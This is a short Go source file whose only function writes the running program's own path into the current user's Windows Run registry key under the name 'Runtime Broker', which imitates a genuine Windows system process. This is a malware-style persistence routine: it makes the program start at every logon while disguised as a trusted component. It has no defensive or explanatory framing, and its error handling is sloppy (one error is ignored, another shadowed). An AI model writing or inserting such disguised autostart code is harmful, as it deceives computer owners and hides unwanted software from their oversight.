package main

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

const startupKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

func AddToStartup() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, startupKey, registry.SET_VALUE)
	if err != nil {
		panic(err)
	}
	defer k.Close()

	exePath, err := os.Executable()
	if err := k.SetStringValue("Runtime Broker", exePath); err != nil {
		panic(err)
	}
	return nil
}
